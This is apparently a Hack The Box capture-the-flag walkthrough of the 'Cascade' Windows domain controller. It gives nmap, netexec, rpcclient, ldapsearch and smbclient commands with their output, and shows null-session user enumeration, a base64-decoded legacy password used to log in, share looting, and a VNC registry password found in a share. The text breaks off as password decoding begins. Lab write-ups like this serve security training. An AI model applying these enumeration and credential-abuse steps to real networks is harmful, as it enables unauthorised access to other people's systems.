---
{"dg-publish":true,"permalink":"/ct-fs/htb/cascade/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #null_session #password_reuse #dissassembly #exe #dll #reversing #decryption #dotpeek


## Recon
![Pasted image 20261025125347.png](/img/user/CTFs/HTB/Images/Cascade%20Images/Pasted%20image%2020261025125347.png)

### Nmap:
```zsh
nmap -p53,135,139,88,636,3268,3269,5985,49155,49158,49165,49154,49157 -sV -sC -T4 -Pn -oA 10.129.139.119 10.129.139.119
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 15:58 -0400
Nmap scan report for 10.129.139.119
Host is up (0.092s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-25 19:58:44Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.98 seconds

```
Initial Portscanning shows a common suite of Windows services and ports like: MS DNS, Kerberos, LDAP, NetBIOS and MSRPC. Adding `CASC-DC1.cascade.local` to `/etc/hosts`.
### Netexec, LDAP, RPC
#### Null and Guest Share access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u '' -p '' --shares                       
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\: 
SMB         10.129.139.119  445    CASC-DC1         [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u 'Guest' -p '' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [-] cascade.local\Guest: STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u 'Guest' -p 'Guest' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [-] cascade.local\Guest:Guest STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u 'Guest' -p 'cascade' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [-] cascade.local\Guest:cascade STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u 'Guest' -p 'Cascade' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [-] cascade.local\Guest:Cascade STATUS_LOGON_FAILURE
```
Enumerating share access for Guest and Null sessions we find we're locked out of share access. However, the error for `Guest` we find that we get a `STATUS_LOGON_FAILURE` indicating our credentials are incorrect. However the error for `Null` is that access was denied. Let's see if we can use Null in other ways.

#### Null Session User Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u '' -p '' --users-export ../files/users.txt       
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\: 
SMB         10.129.139.119  445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.139.119  445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.139.119  445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.139.119  445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.139.119  445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.139.119  445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.139.119  445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.139.119  445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.139.119  445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.139.119  445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.139.119  445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.139.119  445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.139.119  445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.139.119  445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.139.119  445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.139.119  445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.139.119  445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
SMB         10.129.139.119  445    CASC-DC1         [*] Writing 15 local users to ../files/users.txt

```
We do discover that we can pull a valid list of users via Null session. One thing of particular interest is their Guest user is called `CascadeGuest` rather than just `Guest`. Let's see if we can get a Guest share list with this in mind. Exported the user list to `users.txt` to use later.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/scanning]
└─$ nxc smb casc-dc1.cascade.local -u 'CascGuest' -p '' --shares                   
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [-] cascade.local\CascGuest: STATUS_ACCOUNT_DISABLED
```
As you can see we still get no share access but this time it tells us `STATUS_ACCOUNT_DISABLED`. So we'll need to look for other ways in.

#### Users Detailed
```zsh
└─$ for i in '$(cat users.txt)'; do rpcclient -c "queryuser $i" -U '' -N casc-dc1.cascade.local; done
	User Name   :	CascGuest
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for guest access to the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Wed, 31 Dec 1969 19:00:00 EST
	Password can change Time :	Wed, 31 Dec 1969 19:00:00 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x1f5
	group_rid:	0x202
	acb_info :	0x00000215
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x0000000f
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	arksvc
	Full Name   :	ArkSvc
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 29 Jan 2020 16:05:41 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Thu, 09 Jan 2020 11:18:20 EST
	Password can change Time :	Thu, 09 Jan 2020 11:18:20 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x452
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x0000000d
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	s.smith
	Full Name   :	Steve Smith
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapAuditDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Tue, 28 Jan 2020 18:26:39 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Tue, 28 Jan 2020 14:58:05 EST
	Password can change Time :	Tue, 28 Jan 2020 14:58:05 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x453
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000010
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	r.thompson
	Full Name   :	Ryan Thompson
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Tue, 28 Jan 2020 20:11:53 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Thu, 09 Jan 2020 14:31:26 EST
	Password can change Time :	Thu, 09 Jan 2020 14:31:26 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x455
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000002
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	util
	Full Name   :	Util
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Tue, 28 Jan 2020 13:09:47 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 12 Jan 2020 21:07:11 EST
	Password can change Time :	Sun, 12 Jan 2020 21:07:11 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x457
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000001
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	j.wakefield
	Full Name   :	James Wakefield
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Thu, 09 Jan 2020 15:34:44 EST
	Password can change Time :	Thu, 09 Jan 2020 15:34:44 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x45c
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	s.hickson
	Full Name   :	Stephanie Hickson
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 12 Jan 2020 20:24:28 EST
	Password can change Time :	Sun, 12 Jan 2020 20:24:28 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x461
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	j.goodhand
	Full Name   :	John Goodhand
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 12 Jan 2020 20:40:26 EST
	Password can change Time :	Sun, 12 Jan 2020 20:40:26 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x462
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	a.turnbull
	Full Name   :	Adrian Turnbull
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 12 Jan 2020 20:43:13 EST
	Password can change Time :	Sun, 12 Jan 2020 20:43:13 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x464
	group_rid:	0x201
	acb_info :	0x00000214
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	e.crowe
	Full Name   :	Edward Crowe
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 12 Jan 2020 22:45:02 EST
	Password can change Time :	Sun, 12 Jan 2020 22:45:02 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x467
	group_rid:	0x201
	acb_info :	0x00000211
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	b.hanson
	Full Name   :	Ben Hanson
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Mon, 13 Jan 2020 11:35:39 EST
	Password can change Time :	Mon, 13 Jan 2020 11:35:39 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x468
	group_rid:	0x201
	acb_info :	0x00000211
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	d.burman
	Full Name   :	David Burman
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Mon, 13 Jan 2020 11:36:13 EST
	Password can change Time :	Mon, 13 Jan 2020 11:36:13 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x469
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	BackupSvc
	Full Name   :	BackupSvc
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Mon, 13 Jan 2020 11:37:03 EST
	Password can change Time :	Mon, 13 Jan 2020 11:37:03 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x46a
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	j.allen
	Full Name   :	Joseph Allen
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Mon, 13 Jan 2020 12:24:00 EST
	Password can change Time :	Mon, 13 Jan 2020 12:24:00 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x46e
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	User Name   :	i.croft
	Full Name   :	Ian Croft
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	MapDataDrive.vbs
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Wed, 15 Jan 2020 16:46:22 EST
	Password can change Time :	Wed, 15 Jan 2020 16:46:22 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x46f
	group_rid:	0x201
	acb_info :	0x00000211
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000010
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```
Abusing our Null session access we can use a simple for loop reading input from our previously generated `users.txt` and run the `queryuser` command inside `rpcclient` to generate details on every user we were able to enumerate earlier. Nothing immediately sticks out to me except that some users have a recorded logon count while others do not. 

##### LDAP Details
```zsh
for i in '$(cat users.txt)'; do ldapsearch -H ldap://CASC-DC1.cascade.local -x -b "DC=cascade,DC=local" "(sAMAccountName=$i)" > ldap_info.txt; done   


---SNIP---
# numResponses: 5
# numEntries: 1
# numReferences: 3
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (sAMAccountName=r.thompson)
# requesting: ALL
#

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 16
codePage: 0
countryCode: 0
badPasswordTime: 134374333796718800
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
---SNIP---

cn: Steve Smith
sn: Smith
givenName: Steve
distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109180813.0Z
whenChanged: 20200323113113.0Z
displayName: Steve Smith
uSNCreated: 16404
memberOf: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295015
name: Steve Smith
objectGUID:: 39nrOPfEAE2an/UDQy/6fQ==
userAccountControl: 66
---SNIP---
```
Pulling the same data via `ldapsearch` we see that several more details are captured. One particularly interesting item for user `r.thompson` is this `cascadeLegacyPwd:` Key/Value pair which was not present in the data we pulled with `rpcclient`. Let's see if this password is still in use somewhere. It is also noteworthy that `s.smith` is the only member, besides `arksvc` that belongs to "Remote Management Users". This is always a telltale sign that they have `user.txt` in their user folder or Desktop.

##### Ryan 5 Ever
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/files]
└─$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva

┌──(kali㉿kali)-[~/CTF/HTB/cascade/files]
└─$ nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva'    
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva   
```
We decode the base64 value for the `cascadeLegacyPwd` key to reveal a plaintext password for our victim and successfully authenticate to the server with `ry4n5eva`.

#### Authenticated Share Access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/files]
└─$ nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.139.119  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.139.119  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.139.119  445    CASC-DC1         -----           -----------     ------
SMB         10.129.139.119  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.139.119  445    CASC-DC1         Audit$                          
SMB         10.129.139.119  445    CASC-DC1         C$                              Default share
SMB         10.129.139.119  445    CASC-DC1         Data            READ            
SMB         10.129.139.119  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.139.119  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.139.119  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.139.119  445    CASC-DC1         SYSVOL          READ            Logon server share 
```
Enumerating our share access we find that `r.thompson` has read access to a non-standard share called `Data`. Let's check out what's inside it.

##### Loot
```zsh
└─$ smbclient -U 'r.thompson%rY4n5eva' \\\\CASC-DC1.cascade.local\\Data
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

		6553343 blocks of size 4096. 1626358 blocks available
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (3.7 KiloBytes/sec) (average 5.4 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (17.0 KiloBytes/sec) (average 9.3 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (7.5 KiloBytes/sec) (average 8.9 KiloBytes/sec)
smb: \> exit
```
We connect successfully to `Data` and find that we are only able to read and download files within the `IT` directory of the share. It seems we have some meeting notes, the Ark AD Recycle Bin, the `dcdiag.log` file and one belonging to `s.smith` called `VNC Install.reg`.

###### Email Archive
![Pasted image 20261025144850.png](/img/user/CTFs/HTB/Images/Cascade%20Images/Pasted%20image%2020261025144850.png)
Inside the email archive we find one message from June 2018 from `s.smith` to the rest of IT stating that they will be setting up a temporary admin user called `TempAdmin` to perform network migration related tasks. Steve goes on to say it uses the same password as "the normal admin account password". Maybe that will come in use soon. For now, let's keep looking around.

## Initial Access
### Temp
```zsh
└─$ cat s.smith/VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
Inside the `Temp` directory we see entries for our current user and `s.smith` who appears to be the IT manager.  One of those entries appears to be their password hash encoded via Hex.

#### Decoding Steve's Password
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/loot]
